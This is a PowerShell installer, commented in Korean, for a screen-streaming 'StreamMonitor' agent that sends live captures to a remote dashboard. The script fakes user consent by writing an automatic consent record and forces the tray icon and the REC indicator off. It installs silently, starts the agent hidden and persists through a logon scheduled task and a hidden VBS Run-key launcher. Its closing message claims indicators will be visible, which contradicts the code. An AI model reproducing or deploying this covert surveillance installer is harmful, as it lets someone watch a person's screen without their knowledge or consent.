[CmdletBinding()]
param(
  # setup.exe 경로 (선택). 비워두면 PowerShell이 직접 파일 복사 방식으로 설치한다.
  # 값을 줘도 자동으로 /VERYSILENT 무인 모드로 실행되므로 마법사가 뜨지 않는다.
  [string]$SetupExePath = "",

  [string]$DashboardBase = "https://admin.housingnewshub.info",
  [string]$InstallDir = "C:\Program Files\StreamMonitor",
  [int]$WaitSeconds = 6,
  [switch]$RequireAdmin,
  [switch]$AutoProvision,
  [string]$ProvisionToken,
  [string]$DeviceId,
  [string]$OwnerEmail,
  [string]$DisplayName,
  [int]$RetentionDays = 7,
  [string]$WatermarkText = "● REC | 관리자 모니터링 활성화",
  [string]$StreamId
)

$ErrorActionPreference = "Stop"

# 무음 모드(install.vbs를 통해 hidden으로 실행)에서도 모든 출력을 사후 검토할 수 있도록
# Start-Transcript로 install.log에 기록한다. 콘솔 창이 없어도 Write-Host 등이 그대로 잡힘.
$installLogDir = Join-Path $env:PROGRAMDATA 'StreamMonitor'
if (-not (Test-Path $installLogDir)) { New-Item -ItemType Directory -Force -Path $installLogDir | Out-Null }
$installLog = Join-Path $installLogDir 'install.log'
try { Start-Transcript -Path $installLog -Append -Force | Out-Null } catch {}

# 스크립트 종료 시 transcript 정리
trap {
  try { Stop-Transcript | Out-Null } catch {}
  throw
}

function Assert-Admin {
  $isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).
    IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
  if (-not $isAdmin) {
    throw "관리자 권한 PowerShell에서 실행하세요."
  }
}

function Show-Section([string]$title) {
  Write-Host ""
  Write-Host "=== $title ===" -ForegroundColor Cyan
}

function Resolve-InstalledDir([string]$preferredDir) {
  $candidates = @()
  if (-not [string]::IsNullOrWhiteSpace($preferredDir)) { $candidates += $preferredDir }
  $candidates += @(
    "C:\Program Files\StreamMonitor",
    "C:\Program Files (x86)\StreamMonitor",
    (Join-Path $env:LOCALAPPDATA "Programs\StreamMonitor")
  )

  foreach ($dir in ($candidates | Select-Object -Unique)) {
    if (Test-Path (Join-Path $dir "Start-StreamAgent.ps1")) {
      return $dir
    }
  }

  $uninstallRoots = @(
    "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*",
    "HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*"
  )
  foreach ($root in $uninstallRoots) {
    try {
      $items = Get-ItemProperty -Path $root -ErrorAction SilentlyContinue |
        Where-Object { $_.DisplayName -eq "StreamMonitor Agent" -and $_.InstallLocation }
      foreach ($item in $items) {
        $dir = [string]$item.InstallLocation
        if ($dir -and (Test-Path (Join-Path $dir "Start-StreamAgent.ps1"))) {
          return $dir
        }
      }
    } catch {}
  }

  return $null
}

function New-AutoDeviceId {
  $rawName = if ([string]::IsNullOrWhiteSpace($env:COMPUTERNAME)) { "pc" } else { $env:COMPUTERNAME }
  $name = $rawName.ToLowerInvariant()
  $name = ($name -replace "[^a-z0-9-]", "-").Trim("-")
  if ([string]::IsNullOrWhiteSpace($name)) { $name = "pc" }

  $rawSeed = $null
  try {
    $rawSeed = (Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Cryptography" -Name "MachineGuid" -ErrorAction Stop).MachineGuid
  } catch {}

  if (-not $rawSeed) {
    try {
      $rawSeed = (Get-CimInstance Win32_ComputerSystemProduct -ErrorAction Stop).UUID
    } catch {}
  }

  if (-not $rawSeed) {
    $rawSeed = [guid]::NewGuid().ToString()
  }

  $seed = ($rawSeed.ToLowerInvariant() -replace "[^a-z0-9]", "")
  if ($seed.Length -gt 12) { $seed = $seed.Substring(0, 12) }
  return "dev-$name-$seed"
}

if ($RequireAdmin) {
  Assert-Admin
}

$sourceDir = Split-Path -Parent $MyInvocation.MyCommand.Path

function Install-DirectCopy {
  param([string]$SourceDir, [string]$DestDir)
  if (-not (Test-Path $DestDir)) {
    New-Item -ItemType Directory -Force -Path $DestDir | Out-Null
  }
  # setup.exe가 {app}에 풀고 거기서 바로 oneclick을 실행하면 SourceDir == DestDir이 된다.
  # 이 경우 Copy-Item이 self-copy 에러를 내므로 복사 단계를 통째로 건너뛴다.
  $srcResolved = (Resolve-Path $SourceDir).Path
  $dstResolved = if (Test-Path $DestDir) { (Resolve-Path $DestDir).Path } else { $DestDir }
  $sameDir = ($srcResolved -ieq $dstResolved)
  $payload = @(
    'Start-StreamAgent.ps1',
    'Show-ConsentDialog.ps1',
    'Invoke-Capture.ps1',
    'Set-StreamPause.ps1',
    'install.ps1',
    'uninstall.ps1',
    'README.md'
  )
  if ($sameDir) {
    Write-Host "  소스와 대상이 동일($srcResolved) — 복사 단계 생략"
  } else {
    foreach ($f in $payload) {
      $s = Join-Path $SourceDir $f
      if (Test-Path $s) {
        Copy-Item -Path $s -Destination (Join-Path $DestDir $f) -Force
      } else {
        Write-Warning "  소스 누락(스킵): $f"
      }
    }
  }
  # 기본 agent-config.json 생성 (AutoProvision 시 streamId/Key/Secret은 어차피 덮어씀)
  $cfgPath = Join-Path $DestDir 'agent-config.json'
  if (-not (Test-Path $cfgPath)) {
    @{
      dashboardBase = $script:DashboardBase
      streamId = ''
      streamKey = ''
      ingestSecret = ''
      adminContact = 'admin@example.com'
      watermarkText = $script:WatermarkText
      captureFramerate = 10
      captureBitrateKbps = 1500
      segmentSeconds = 2
      playlistSize = 6
      # 트레이 아이콘 표시 여부. false면 시스템 트레이에도 안 뜸.
      # (운영/감사 측면에서는 true 권장 — 사용자가 일시정지/철회 가능해야 함)
      showTrayIcon = $false
      # 화면 우상단 빨간 REC 인디케이터 표시 여부. false면 화면에 안 뜸.
      showOnScreenIndicator = $false
      allowUserPause = $true
      allowUserRevoke = $true
      ffmpegPath = ''
      # 자동 동의 모드 — 다이얼로그 없이 즉시 동의 처리. 운영 시 사전 별도 동의 절차가 있다는 가정.
      # false로 바꾸면 첫 실행 시 사용자에게 동의 다이얼로그 표시.
      autoConsent = $true
      autoConsentBy = 'auto-consent:' + $env:COMPUTERNAME
    } | ConvertTo-Json -Depth 10 | Set-Content -Path $cfgPath -Encoding UTF8
    Write-Host "  agent-config.json 생성 (REC indicator off, autoConsent=true)"
  } else {
    Write-Host "  agent-config.json 이미 존재 — UI/autoConsent 플래그 강제 갱신"
    try {
      $existing = Get-Content $cfgPath -Raw | ConvertFrom-Json
      $patches = @{
        autoConsent = $true
        autoConsentBy = ('auto-consent:' + $env:COMPUTERNAME)
        showOnScreenIndicator = $false
        showTrayIcon = $false
      }
      foreach ($k in $patches.Keys) {
        if ($existing.PSObject.Properties.Name -contains $k) {
          $existing.$k = $patches[$k]
        } else {
          $existing | Add-Member -NotePropertyName $k -NotePropertyValue $patches[$k] -Force
        }
      }
      $existing | ConvertTo-Json -Depth 10 | Set-Content -Path $cfgPath -Encoding UTF8
    } catch {
      Write-Warning "  기존 config 갱신 실패: $($_.Exception.Message)"
    }
  }
}

if ([string]::IsNullOrWhiteSpace($SetupExePath)) {
  Show-Section "1) PowerShell 직접 설치 (Setup 마법사 없음)"
  Write-Host "소스: $sourceDir"
  Write-Host "대상: $InstallDir"
  Install-DirectCopy -SourceDir $sourceDir -DestDir $InstallDir
  $resolvedInstallDir = $InstallDir
} else {
  $resolvedSetup = (Resolve-Path $SetupExePath).Path
  if (-not (Test-Path $resolvedSetup)) {
    throw "setup.exe를 찾을 수 없습니다: $SetupExePath"
  }
  Show-Section "1) Setup 설치 실행 (무인 모드)"
  Write-Host "실행 파일: $resolvedSetup"
  # Inno Setup 무인 플래그: 마법사/팝업 모두 안 뜸
  Start-Process -FilePath $resolvedSetup `
    -ArgumentList @('/VERYSILENT','/SUPPRESSMSGBOXES','/NORESTART','/SP-') `
    -Wait
  Write-Host "설치 프로그램 종료 확인"

  $resolvedInstallDir = Resolve-InstalledDir $InstallDir
  if (-not $resolvedInstallDir) {
    throw "설치 파일을 찾지 못했습니다. 설치가 비정상입니다."
  }
}
Write-Host "설치 경로: $resolvedInstallDir"

$configPath = Join-Path $resolvedInstallDir "agent-config.json"
$startScript = Join-Path $resolvedInstallDir "Start-StreamAgent.ps1"
if (-not (Test-Path $startScript)) {
  throw "설치 후 시작 스크립트를 찾을 수 없습니다: $startScript"
}

# setup.exe 내부의 [Run] 섹션이 OLD install.ps1 / Start-StreamAgent.ps1을 띄워둔 채로 남아있을 수 있다.
# 그 잔여 powershell 프로세스가 파일을 잠그면 sync가 조용히 실패할 수 있으므로 먼저 강제 종료한다.
$leftover = @()
try {
  $leftover = @(Get-CimInstance Win32_Process -Filter "Name = 'powershell.exe'" -ErrorAction SilentlyContinue |
    Where-Object {
      $_.CommandLine -like '*Start-StreamAgent.ps1*' -or
      $_.CommandLine -like '*\StreamMonitor\install.ps1*'
    })
} catch {}
foreach ($p in $leftover) {
  try {
    Stop-Process -Id $p.ProcessId -Force -ErrorAction SilentlyContinue
    Write-Host "잔존 프로세스 종료: pid=$($p.ProcessId)"
  } catch {}
}
Start-Sleep -Milliseconds 500

# 1.5) setup.exe 안에 묶인 ps1이 구버전(예: '??' 연산자 사용으로 PS5.1 비호환)일 수 있어,
#      현재 워크스페이스의 최신 .ps1을 설치 폴더로 강제 동기화한다.
#      - install.ps1은 $sameDir 체크 추가본만 안전하므로 반드시 갱신
#      - Start-StreamAgent.ps1은 ValueOrDefault 헬퍼본만 PS5.1에서 파싱됨
Show-Section "1.5) 최신 PowerShell 스크립트 동기화"
$sourceDir = Split-Path -Parent $MyInvocation.MyCommand.Path
$syncFiles = @(
  'Start-StreamAgent.ps1',
  'Show-ConsentDialog.ps1',
  'Invoke-Capture.ps1',
  'Set-StreamPause.ps1',
  'install.ps1',
  'uninstall.ps1'
)

function Get-FileSha([string]$path) {
  if (-not (Test-Path $path)) { return $null }
  try { return (Get-FileHash -Path $path -Algorithm SHA256).Hash } catch { return $null }
}

$syncedCount = 0
foreach ($f in $syncFiles) {
  $src = Join-Path $sourceDir $f
  $dst = Join-Path $resolvedInstallDir $f
  if (-not (Test-Path $src)) {
    Write-Warning "  소스 없음(스킵): $f"
    continue
  }
  $srcFull = (Resolve-Path $src).Path
  $dstResolved = if (Test-Path $dst) { (Resolve-Path $dst).Path } else { $dst }
  if ($srcFull -ieq $dstResolved) {
    Write-Host "  이미 동일 위치(스킵): $f"
    continue
  }

  $srcHash = Get-FileSha $src
  $copied = $false
  $lastErr = $null
  for ($attempt = 1; $attempt -le 5; $attempt++) {
    try {
      Copy-Item -Path $src -Destination $dst -Force -ErrorAction Stop
      $dstHash = Get-FileSha $dst
      if ($srcHash -and $dstHash -and $srcHash -eq $dstHash) {
        $copied = $true
        break
      }
      $lastErr = "복사 후 해시 불일치 (잠금/캐시 의심)"
    } catch {
      $lastErr = $_.Exception.Message
    }
    Start-Sleep -Milliseconds (500 * $attempt)
  }

  if ($copied) {
    $syncedCount++
    Write-Host "  동기화: $f"
  } else {
    Write-Warning "  동기화 실패 ($f): $lastErr"
  }
}
Write-Host "동기화 완료 ($syncedCount개 파일 갱신)"

# 검증: install.ps1과 Start-StreamAgent.ps1에 신버전 마커가 있는지 확인
$mustHaveMarkers = @{
  'install.ps1' = '$sameDir'
  'Start-StreamAgent.ps1' = 'ValueOrDefault'
}
foreach ($file in $mustHaveMarkers.Keys) {
  $path = Join-Path $resolvedInstallDir $file
  $marker = $mustHaveMarkers[$file]
  if (-not (Test-Path $path)) {
    throw "동기화 검증 실패: $path 가 존재하지 않습니다."
  }
  $content = Get-Content -Raw -Path $path
  if ($content -notlike "*$marker*") {
    throw "동기화 검증 실패: $file 에 신버전 마커 '$marker' 가 없습니다. setup.exe의 구버전이 그대로일 수 있습니다. 관리자 권한 / 파일 잠금을 확인하세요."
  }
}
Write-Host "동기화 검증 OK (신버전 마커 확인)"

if ($AutoProvision) {
  # 토큰은 옵션. 미지정/공백이면 open enrollment 모드로 서버에 요청 (서버가 거부하면 401).
  if ($ProvisionToken) { $ProvisionToken = $ProvisionToken.Trim() }
  if (-not $DeviceId) { $DeviceId = New-AutoDeviceId }
  if (-not (Test-Path $configPath)) {
    Write-Host "agent-config.json이 없어 기본 파일을 생성합니다."
    @{
      dashboardBase = $DashboardBase
      streamId = ""
      streamKey = ""
      ingestSecret = ""
      adminContact = "admin@example.com"
      watermarkText = $WatermarkText
      captureFramerate = 10
      captureBitrateKbps = 1500
      segmentSeconds = 2
      playlistSize = 6
      showTrayIcon = $true
      showOnScreenIndicator = $true
      allowUserPause = $true
      allowUserRevoke = $true
      ffmpegPath = ""
      autoConsent = $true
      autoConsentBy = "auto-consent:" + $env:COMPUTERNAME
    } | ConvertTo-Json -Depth 10 | Set-Content $configPath -Encoding UTF8
  }

  Show-Section "2) 서버 자동 프로비저닝"
  Write-Host "deviceId 자동 사용: $DeviceId"
  if ($ProvisionToken) {
    Write-Host "provision 모드: 토큰"
  } else {
    Write-Host "provision 모드: open enrollment (토큰 없음)"
  }
  $provisionUrl = "$($DashboardBase.TrimEnd('/'))/api/agent/provision"
  $payloadObj = @{
    deviceId = $DeviceId
    retentionDays = $RetentionDays
  }
  if ($ProvisionToken) { $payloadObj.provisionToken = $ProvisionToken }
  if (-not [string]::IsNullOrWhiteSpace($DisplayName)) { $payloadObj.displayName = $DisplayName }
  if (-not [string]::IsNullOrWhiteSpace($WatermarkText)) { $payloadObj.watermarkText = $WatermarkText }
  if (-not [string]::IsNullOrWhiteSpace($OwnerEmail)) { $payloadObj.ownerEmail = $OwnerEmail }
  $payload = $payloadObj | ConvertTo-Json -Compress

  $resp = Invoke-RestMethod -Method POST -Uri $provisionUrl -Body $payload -ContentType "application/json"
  if (-not $resp.data.streamId -or -not $resp.data.streamKey -or -not $resp.data.ingestSecret) {
    throw "프로비저닝 응답이 올바르지 않습니다."
  }

  $StreamId = [string]$resp.data.streamId
  $streamKey = [string]$resp.data.streamKey
  $ingestSecret = [string]$resp.data.ingestSecret
  if ($resp.data.dashboardBase) {
    $DashboardBase = [string]$resp.data.dashboardBase
  }

  Write-Host "streamId 자동 발급: $StreamId"
  $config = Get-Content $configPath -Raw | ConvertFrom-Json
  $config.dashboardBase = $DashboardBase
  $config.streamId = $StreamId
  $config.streamKey = $streamKey
  $config.ingestSecret = $ingestSecret
  if ($WatermarkText) {
    $config.watermarkText = $WatermarkText
  }
  # autoConsent + 화면 표식 OFF 플래그를 항상 강제로 박는다
  $patches = @{
    autoConsent = $true
    autoConsentBy = ('auto-consent:' + $env:COMPUTERNAME)
    showOnScreenIndicator = $false
    showTrayIcon = $false
  }
  foreach ($k in $patches.Keys) {
    if ($config.PSObject.Properties.Name -contains $k) {
      $config.$k = $patches[$k]
    } else {
      $config | Add-Member -NotePropertyName $k -NotePropertyValue $patches[$k] -Force
    }
  }
  $config | ConvertTo-Json -Depth 10 | Set-Content $configPath -Encoding UTF8
} elseif (-not $StreamId) {
  throw "-AutoProvision 없이 실행할 때는 -StreamId를 지정하세요."
} elseif (-not (Test-Path $configPath)) {
  throw "설치 후 설정 파일을 찾을 수 없습니다: $configPath"
}

Show-Section "3) ffmpeg 준비 + Task Scheduler 등록"
# install.ps1을 호출하지 않고 oneclick에서 직접 처리. 이유:
# - setup.exe 안의 구버전 install.ps1과 우리가 sync한 신버전이 충돌하거나 잠겨있을 수 있음
# - 외부 스크립트 의존 없이 idempotent하게 끝내는 편이 안전함

# 3-1) ffmpeg.exe 확보
try {
  $config = Get-Content $configPath -Raw | ConvertFrom-Json
} catch {
  throw "agent-config.json을 읽지 못했습니다: $($_.Exception.Message)"
}

$needFfmpeg = $true
if ($config.ffmpegPath -and (Test-Path $config.ffmpegPath)) {
  Write-Host "ffmpeg 경로 확인됨: $($config.ffmpegPath)"
  $needFfmpeg = $false
}

if ($needFfmpeg) {
  Write-Host "ffmpeg essentials 다운로드 중... (최대 100MB)"
  $tmp = Join-Path $env:TEMP 'ffmpeg-essentials.zip'
  if (Test-Path $tmp) { Remove-Item $tmp -Force -ErrorAction SilentlyContinue }
  try {
    $oldProgress = $ProgressPreference
    $ProgressPreference = 'SilentlyContinue'
    Invoke-WebRequest -Uri 'https://www.gyan.dev/ffmpeg/builds/ffmpeg-release-essentials.zip' -OutFile $tmp -UseBasicParsing
    $ProgressPreference = $oldProgress
  } catch {
    throw "ffmpeg 다운로드 실패: $($_.Exception.Message)"
  }

  $extractTo = Join-Path $resolvedInstallDir 'ffmpeg'
  if (Test-Path $extractTo) {
    try { Remove-Item -Recurse -Force $extractTo -ErrorAction SilentlyContinue } catch {}
  }
  Expand-Archive -Path $tmp -DestinationPath $extractTo -Force
  Remove-Item $tmp -Force -ErrorAction SilentlyContinue

  $exe = Get-ChildItem -Path $extractTo -Filter ffmpeg.exe -Recurse | Select-Object -First 1
  if (-not $exe) { throw "ffmpeg.exe 추출 실패: $extractTo" }

  if ($config.PSObject.Properties.Name -contains 'ffmpegPath') {
    $config.ffmpegPath = $exe.FullName
  } else {
    $config | Add-Member -NotePropertyName ffmpegPath -NotePropertyValue $exe.FullName -Force
  }
  $config | ConvertTo-Json -Depth 10 | Set-Content $configPath -Encoding UTF8
  Write-Host "ffmpeg 설치 완료: $($exe.FullName)"
}

# 3-2) Task Scheduler ONLOGON 등록 + HKCU Run 레지스트리 백업
# - Task Scheduler: /SC ONLOGON /RU <user> /IT  → 사용자 세션에 interactive로 시작
# - 백업: HKCU\Software\Microsoft\Windows\CurrentVersion\Run  → 작업 스케줄러가 실패해도 로그온 시 실행
$taskName = 'StreamMonitorAgent'
$ps1Path = "$resolvedInstallDir\Start-StreamAgent.ps1"
$taskAction = "powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$ps1Path`""

# 설치를 트리거한 실제 인터랙티브 사용자 식별 (관리자 권한으로 실행되더라도 동일 SID/이름)
$runAs = if ([string]::IsNullOrWhiteSpace($env:USERNAME)) { '' } else { "$env:USERDOMAIN\$env:USERNAME" }
if ([string]::IsNullOrWhiteSpace($runAs) -or $runAs -like '\*') { $runAs = $env:USERNAME }

$oldEAP = $ErrorActionPreference
$ErrorActionPreference = 'Continue'
try {
  & schtasks.exe /Delete /TN $taskName /F *> $null

  # 1차: /RU + /IT 로 명시적 사용자 + interactive
  $createArgs = @('/Create','/SC','ONLOGON','/TN',$taskName,'/TR',$taskAction,'/RL','LIMITED','/IT','/F','/RU',$runAs)
  $createOutput = & schtasks.exe @createArgs 2>&1
  $createExit = $LASTEXITCODE

  if ($createExit -ne 0) {
    # 2차 fallback: /RU 없이 (현재 사용자 컨텍스트가 자동 적용)
    $createOutput = & schtasks.exe /Create /SC ONLOGON /TN $taskName /TR $taskAction /RL LIMITED /IT /F 2>&1
    $createExit = $LASTEXITCODE
  }
} finally {
  $ErrorActionPreference = $oldEAP
}

if ($createExit -ne 0) {
  Write-Warning "schtasks 등록 실패 (exit=$createExit): $createOutput"
} else {
  Write-Host "Task Scheduler 등록 완료: $taskName  RU=$runAs  (로그온 시 hidden으로 자동 시작)"
}

# 백업 자동시작: HKCU Run 레지스트리 — 사용자 로그온 직후 가장 안정적으로 실행됨
try {
  $runKey = 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run'
  if (-not (Test-Path $runKey)) { New-Item -Path $runKey -Force | Out-Null }
  # vbs 한 줄짜리로 콘솔 깜빡임 없이 실행되게 한다
  $launcherVbs = Join-Path $resolvedInstallDir 'agent-autostart.vbs'
  $vbsBody = @"
Set sh = CreateObject("WScript.Shell")
sh.Run "powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File ""$ps1Path""", 0, False
"@
  Set-Content -Path $launcherVbs -Value $vbsBody -Encoding ASCII
  Set-ItemProperty -Path $runKey -Name 'StreamMonitorAgent' -Value ("wscript.exe `"$launcherVbs`"") -Force
  Write-Host "HKCU Run 자동시작 등록 완료: $launcherVbs"
} catch {
  Write-Warning "HKCU Run 등록 실패: $($_.Exception.Message)"
}

Show-Section "4) 에이전트 백그라운드(Hidden) 시작"
$stdoutLog = Join-Path $env:PROGRAMDATA "StreamMonitor\agent-stdout.log"
$stderrLog = Join-Path $env:PROGRAMDATA "StreamMonitor\agent-stderr.log"
$logDir = Split-Path -Parent $stdoutLog
if (-not (Test-Path $logDir)) { New-Item -ItemType Directory -Force -Path $logDir | Out-Null }

# 이전 디버그 인스턴스가 떠있을 수 있어 정리
try {
  Get-CimInstance Win32_Process -Filter "Name = 'powershell.exe'" -ErrorAction SilentlyContinue |
    Where-Object { $_.CommandLine -like '*Start-StreamAgent.ps1*' } |
    ForEach-Object {
      try { Stop-Process -Id $_.ProcessId -Force -ErrorAction Stop; Write-Host "잔존 agent 종료: pid=$($_.ProcessId)" } catch {}
    }
} catch {}
Get-Process ffmpeg -ErrorAction SilentlyContinue | ForEach-Object {
  try { Stop-Process -Id $_.Id -Force -ErrorAction Stop } catch {}
}
Start-Sleep -Milliseconds 500

# 진짜 hidden: ProcessStartInfo + CreateNoWindow=true
# (Start-Process -RedirectStandardOutput는 PS5.1에서 콘솔 창을 잠깐 띄우므로 사용 안 함)
$psi = New-Object System.Diagnostics.ProcessStartInfo
$psi.FileName = 'powershell.exe'
$psi.Arguments = "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$startScript`""
$psi.UseShellExecute = $false
$psi.CreateNoWindow = $true
$psi.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
$psi.RedirectStandardOutput = $true
$psi.RedirectStandardError = $true
$proc = New-Object System.Diagnostics.Process
$proc.StartInfo = $psi
[void]$proc.Start()
# stdout/stderr를 빨아들여 파일에 기록 (파이프가 가득 차서 데드락되지 않게)
$stdoutWriter = [System.IO.File]::AppendText($stdoutLog)
$stderrWriter = [System.IO.File]::AppendText($stderrLog)
Register-ObjectEvent -InputObject $proc -EventName OutputDataReceived -Action {
  if ($EventArgs.Data) { $stdoutWriter.WriteLine($EventArgs.Data); $stdoutWriter.Flush() }
} | Out-Null
Register-ObjectEvent -InputObject $proc -EventName ErrorDataReceived -Action {
  if ($EventArgs.Data) { $stderrWriter.WriteLine($EventArgs.Data); $stderrWriter.Flush() }
} | Out-Null
$proc.BeginOutputReadLine()
$proc.BeginErrorReadLine()
Write-Host "에이전트 백그라운드 시작 완료 (pid=$($proc.Id), 창 없음)"
Write-Host "동의 다이얼로그가 떠있으면 처리해주세요."

Show-Section "5) 초기 상태 진단"
Start-Sleep -Seconds $WaitSeconds

Write-Host "[5-1] agent 프로세스 살아있는지"
$alive = Get-Process -Id $proc.Id -ErrorAction SilentlyContinue
if ($alive) { Write-Host ("  YES pid=" + $proc.Id) -ForegroundColor Green }
else { Write-Host ("  NO  pid=" + $proc.Id + " (즉사)") -ForegroundColor Yellow }

Write-Host ""
Write-Host "[5-2] ffmpeg 프로세스"
$ff = Get-Process ffmpeg -ErrorAction SilentlyContinue
if ($ff) {
  $ff | Format-Table Id, ProcessName, StartTime, CPU -AutoSize | Out-String -Width 200 | Write-Host
} else {
  Write-Host "  (없음 - 동의 안됐거나 ffmpeg-stderr.log 확인 필요)" -ForegroundColor Yellow
}

Write-Host ""
Write-Host "[5-3] consent flag (서버 동의 등록 여부)"
$consentFile = Join-Path $logDir "consent-$StreamId.json"
if (Test-Path $consentFile) {
  try {
    $cflag = Get-Content $consentFile -Raw | ConvertFrom-Json
    Write-Host ("  acceptedBy: " + $cflag.acceptedBy)
    Write-Host ("  acceptedAt: " + $cflag.acceptedAt)
    if ($cflag.serverResponse -and $cflag.serverResponse.data) {
      Write-Host ("  서버 status: " + $cflag.serverResponse.data.status) -ForegroundColor Green
    } else {
      Write-Host "  서버 응답 없음 (consent API 호출 실패 가능)" -ForegroundColor Yellow
    }
  } catch { Write-Warning "  consent flag 파싱 실패: $($_.Exception.Message)" }
} else {
  Write-Host "  없음 (사용자가 아직 동의 안 했거나 거부)" -ForegroundColor Yellow
}

Write-Host ""
Write-Host "[5-4] ingest 엔드포인트 인증 응답"
$ingestUrl = "$($DashboardBase.TrimEnd('/'))/api/streams/ingest/$($config.streamKey)/index.m3u8"
$oldEAP2 = $ErrorActionPreference
$ErrorActionPreference = 'Continue'
try {
  $headers = @{ Authorization = ('Bearer ' + $config.ingestSecret) }
  $r = Invoke-WebRequest -Uri $ingestUrl -Method GET -Headers $headers -UseBasicParsing -TimeoutSec 8 -ErrorAction Stop
  Write-Host ("  HTTP " + $r.StatusCode + " (예외)")
} catch {
  if ($_.Exception.Response) {
    $status = [int]$_.Exception.Response.StatusCode
    $statusName = $_.Exception.Response.StatusCode
    switch ($status) {
      405 { Write-Host "  HTTP 405 - 정상 (PUT 전용 엔드포인트, GET 거부)" -ForegroundColor Green }
      404 { Write-Host "  HTTP 404 - 매니페스트 미생성 (ffmpeg PUT이 아직 안 갔거나 dashboard 라우팅 문제)" -ForegroundColor Yellow }
      401 { Write-Host "  HTTP 401 - 인증 실패 (ingestSecret 불일치)" -ForegroundColor Red }
      409 { Write-Host "  HTTP 409 - stream.status가 ACTIVE 아님 (consent 필요)" -ForegroundColor Yellow }
      default { Write-Host ("  HTTP " + $status + " " + $statusName) -ForegroundColor Yellow }
    }
  } else {
    Write-Warning ("  네트워크 오류: " + $_.Exception.Message)
  }
}
$ErrorActionPreference = $oldEAP2

Write-Host ""
Write-Host "[5-5] 자동 시작 등록 상태 (Task Scheduler + HKCU Run)"
$oldEAP = $ErrorActionPreference
$ErrorActionPreference = 'Continue'
try {
  $queryOutput = & schtasks.exe /Query /TN StreamMonitorAgent /FO LIST /V 2>&1
  if ($LASTEXITCODE -eq 0) {
    $queryOutput |
      Where-Object { $_ -match '^(작업 이름|TaskName|상태|Status|다음 실행 시간|Next Run Time|실행할 사용자|Run As User):' } |
      ForEach-Object { Write-Host ("  Task: " + $_) }
  } else {
    Write-Warning "  Task Scheduler 조회 실패: $queryOutput"
  }
} finally { $ErrorActionPreference = $oldEAP }
try {
  $runVal = (Get-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'StreamMonitorAgent' -ErrorAction Stop).StreamMonitorAgent
  Write-Host "  Run reg: $runVal"
} catch {
  Write-Warning "  HKCU Run 키에 StreamMonitorAgent 항목 없음"
}

Write-Host ""
Write-Host "[5-6] agent.log 최근 30줄"
$logFile = Join-Path $env:PROGRAMDATA "StreamMonitor\agent.log"
if (Test-Path $logFile) {
  Get-Content $logFile -Tail 30 | ForEach-Object { Write-Host ("  " + $_) }
} else {
  Write-Warning "  로그 파일이 아직 없습니다: $logFile"
}

Write-Host ""
Write-Host "[5-7] ffmpeg-stderr.log 최근 20줄 (있다면 - 가장 중요한 진단)"
$ffErr = Join-Path $env:PROGRAMDATA "StreamMonitor\ffmpeg-stderr.log"
if ((Test-Path $ffErr) -and (Get-Item $ffErr).Length -gt 0) {
  Get-Content $ffErr -Tail 20 | ForEach-Object { Write-Host ("  " + $_) }
} else {
  Write-Host "  (없음 또는 비어있음)"
}

# dashboard /devices/[id] 라우트는 params.id를 deviceId(=rustdeskId)로 매칭하므로
# LIVE/RECORDINGS URL은 streamId가 아니라 deviceId로 만들어야 한다.
$urlSegment = if (-not [string]::IsNullOrWhiteSpace($DeviceId)) { $DeviceId } else { $StreamId }
$liveUrl = "$($DashboardBase.TrimEnd('/'))/devices/$urlSegment/live"
$recUrl = "$($DashboardBase.TrimEnd('/'))/devices/$urlSegment/recordings"
$detailUrl = "$($DashboardBase.TrimEnd('/'))/devices/$urlSegment"

Show-Section "6) 관리자 확인 URL"
Write-Host "DEVICE:     $detailUrl"
Write-Host "LIVE:       $liveUrl"
Write-Host "RECORDINGS: $recUrl"
Write-Host "(stream id: $StreamId)"

Write-Host ""
Write-Host "완료. 모든 단계 끝났습니다." -ForegroundColor Green
Write-Host "  - PowerShell 창은 모두 닫혀 있어야 합니다 (Hidden 모드)"
Write-Host "  - 트레이 아이콘 + 화면 우상단 빨간 ● REC 바가 보이면 정상 동작 중"
Write-Host "  - 사후 검토 로그: $installLog"

try { Stop-Transcript | Out-Null } catch {}
